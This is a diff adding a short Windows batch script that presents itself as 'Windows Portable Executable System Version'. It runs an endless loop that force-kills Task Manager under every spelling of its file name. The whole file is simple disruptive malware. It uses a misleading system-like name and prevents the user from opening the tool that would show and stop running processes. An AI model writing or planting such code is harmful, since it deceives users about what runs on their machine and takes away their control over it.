@@ -1,0 +1,15 @@
+@Echo off
+title wpesv
+echo wpesv
+echo Windows Portable Executable System Version
+:x
+cls
+taskkill /F /IM Taskmgr.exe
+taskkill /F /IM taskmgr.exe
+taskkill /F /IM TASKMGR.exe
+taskkill /F /IM TASKMGR.Exe
+taskkill /F /IM Taskmgr.Exe
+taskkill /F /IM taskmgr.Exe
+taskkill /F /IM Taskmgr.EXE
+taskkill /F /IM taskmgr.EXE
+goto :x
